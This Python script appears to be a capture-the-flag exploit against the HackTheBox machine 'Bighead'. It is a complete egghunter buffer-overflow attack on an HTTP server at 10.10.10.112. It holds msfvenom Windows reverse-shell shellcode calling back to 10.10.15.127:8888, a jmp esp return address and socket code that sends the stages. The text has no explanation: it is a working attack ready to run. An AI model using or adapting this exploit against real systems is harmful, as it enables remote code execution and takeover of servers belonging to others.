import os
import socket
import sys

# !mona egg -t b33f
egghunter = (
        "6681caff0f42526a0258cd2e3c055a74"
        "efb8623333668bfaaf75eaaf75e7ffe7")

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.127 LPORT=8888 EXITFUNC=thread -b '\x00\x0a\x0d\x20\x3d\x3f' -f c
'''egg = (
"\xda\xd5\xd9\x74\x24\xf4\xbd\x85\xd6\x32\xe2\x5f\x2b\xc9\xb1"
"\x52\x83\xef\xfc\x31\x6f\x13\x03\xea\xc5\xd0\x17\x08\x01\x96"
"\xd8\xf0\xd2\xf7\x51\x15\xe3\x37\x05\x5e\x54\x88\x4d\x32\x59"
"\x63\x03\xa6\xea\x01\x8c\xc9\x5b\xaf\xea\xe4\x5c\x9c\xcf\x67"
"\xdf\xdf\x03\x47\xde\x2f\x56\x86\x27\x4d\x9b\xda\xf0\x19\x0e"
"\xca\x75\x57\x93\x61\xc5\x79\x93\x96\x9e\x78\xb2\x09\x94\x22"
"\x14\xa8\x79\x5f\x1d\xb2\x9e\x5a\xd7\x49\x54\x10\xe6\x9b\xa4"
"\xd9\x45\xe2\x08\x28\x97\x23\xae\xd3\xe2\x5d\xcc\x6e\xf5\x9a"
"\xae\xb4\x70\x38\x08\x3e\x22\xe4\xa8\x93\xb5\x6f\xa6\x58\xb1"
"\x37\xab\x5f\x16\x4c\xd7\xd4\x99\x82\x51\xae\xbd\x06\x39\x74"
"\xdf\x1f\xe7\xdb\xe0\x7f\x48\x83\x44\xf4\x65\xd0\xf4\x57\xe2"
"\x15\x35\x67\xf2\x31\x4e\x14\xc0\x9e\xe4\xb2\x68\x56\x23\x45"
"\x8e\x4d\x93\xd9\x71\x6e\xe4\xf0\xb5\x3a\xb4\x6a\x1f\x43\x5f"
"\x6a\xa0\x96\xf0\x3a\x0e\x49\xb1\xea\xee\x39\x59\xe0\xe0\x66"
"\x79\x0b\x2b\x0f\x10\xf6\xbc\x3a\xef\xf6\x3b\x53\xed\x06\x45"
"\x18\x78\xe0\x2f\x4e\x2d\xbb\xc7\xf7\x74\x37\x79\xf7\xa2\x32"
"\xb9\x73\x41\xc3\x74\x74\x2c\xd7\xe1\x74\x7b\x85\xa4\x8b\x51"
"\xa1\x2b\x19\x3e\x31\x25\x02\xe9\x66\x62\xf4\xe0\xe2\x9e\xaf"
"\x5a\x10\x63\x29\xa4\x90\xb8\x8a\x2b\x19\x4c\xb6\x0f\x09\x88"
"\x37\x14\x7d\x44\x6e\xc2\x2b\x22\xd8\xa4\x85\xfc\xb7\x6e\x41"
"\x78\xf4\xb0\x17\x85\xd1\x46\xf7\x34\x8c\x1e\x08\xf8\x58\x97"
"\x71\xe4\xf8\x58\xa8\xac\x19\xbb\x78\xd9\xb1\x62\xe9\x60\xdc"
"\x94\xc4\xa7\xd9\x16\xec\x57\x1e\x06\x85\x52\x5a\x80\x76\x2f"
"\xf3\x65\x78\x9c\xf4\xaf" )'''
egg = (
"\xb8\xdd\xdd\x99\xb4\xda\xd6\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\x36\x21\x7b\x41\x34\x32\xfe"
"\xaa\xc4\xc3\x9f\x23\x21\xf2\x9f\x50\x22\xa5\x2f\x12\x66\x4a"
"\xdb\x76\x92\xd9\xa9\x5e\x95\x6a\x07\xb9\x98\x6b\x34\xf9\xbb"
"\xef\x47\x2e\x1b\xd1\x87\x23\x5a\x16\xf5\xce\x0e\xcf\x71\x7c"
"\xbe\x64\xcf\xbd\x35\x36\xc1\xc5\xaa\x8f\xe0\xe4\x7d\x9b\xba"
"\x26\x7c\x48\xb7\x6e\x66\x8d\xf2\x39\x1d\x65\x88\xbb\xf7\xb7"
"\x71\x17\x36\x78\x80\x69\x7f\xbf\x7b\x1c\x89\xc3\x06\x27\x4e"
"\xb9\xdc\xa2\x54\x19\x96\x15\xb0\x9b\x7b\xc3\x33\x97\x30\x87"
"\x1b\xb4\xc7\x44\x10\xc0\x4c\x6b\xf6\x40\x16\x48\xd2\x09\xcc"
"\xf1\x43\xf4\xa3\x0e\x93\x57\x1b\xab\xd8\x7a\x48\xc6\x83\x12"
"\xbd\xeb\x3b\xe3\xa9\x7c\x48\xd1\x76\xd7\xc6\x59\xfe\xf1\x11"
"\x9d\xd5\x46\x8d\x60\xd6\xb6\x84\xa6\x82\xe6\xbe\x0f\xab\x6c"
"\x3e\xaf\x7e\x22\x6e\x1f\xd1\x83\xde\xdf\x81\x6b\x34\xd0\xfe"
"\x8c\x37\x3a\x97\x27\xc2\xad\x92\xbd\xc2\x2a\xcb\xc3\xda\x35"
"\xb0\x4d\x3c\x5f\xd6\x1b\x97\xc8\x4f\x06\x63\x68\x8f\x9c\x0e"
"\xaa\x1b\x13\xef\x65\xec\x5e\xe3\x12\x1c\x15\x59\xb4\x23\x83"
"\xf5\x5a\xb1\x48\x05\x14\xaa\xc6\x52\x71\x1c\x1f\x36\x6f\x07"
"\x89\x24\x72\xd1\xf2\xec\xa9\x22\xfc\xed\x3c\x1e\xda\xfd\xf8"
"\x9f\x66\xa9\x54\xf6\x30\x07\x13\xa0\xf2\xf1\xcd\x1f\x5d\x95"
"\x88\x53\x5e\xe3\x94\xb9\x28\x0b\x24\x14\x6d\x34\x89\xf0\x79"
"\x4d\xf7\x60\x85\x84\xb3\x81\x64\x0c\xce\x29\x31\xc5\x73\x34"
"\xc2\x30\xb7\x41\x41\xb0\x48\xb6\x59\xb1\x4d\xf2\xdd\x2a\x3c"
"\x6b\x88\x4c\x93\x8c\x99" )

'''egg = ( 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x07\x68"
"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5" )
'''

stage1 = "b33fb33f" + egg
stage2 = "A" * 72 + "FD125062" + egghunter # 0x625012fd - jmp esp

request = (
        "%s /%s HTTP/1.1\r\n"
        "Host: dev.bighead.htb\r\n\r\n")

# send stage 1 - egg (1st)
evil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
evil.connect(("10.10.10.112", 80))
evil.send(request % ("GET", stage1))
evil.recv(1024)
os.write(1, "[+] 1st egg sent!\n")
evil.close()

# send stage 1 - egg (2nd)
evil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
evil.connect(("10.10.10.112", 80))
evil.send(request % ("GET", stage1))
evil.recv(1024)
os.write(1, "[+] 2nd egg sent!\n")
evil.close()

# send stage 1 - egg (3rd)
evil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
evil.connect(("10.10.10.112", 80))
evil.send(request % ("GET", stage1))
evil.recv(1024)
os.write(1, "[+] 3rd egg sent!\n")
evil.close()

proxy={'http':'127.0.0.1:8080'}

# send stage 2 - egghunter
evil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
evil.connect(("10.10.10.112", 80))
evil.send(request % ("HEAD", stage2))
os.write(1, "[+] Egghunter sent!\n")
evil.recv(1024)
evil.close()
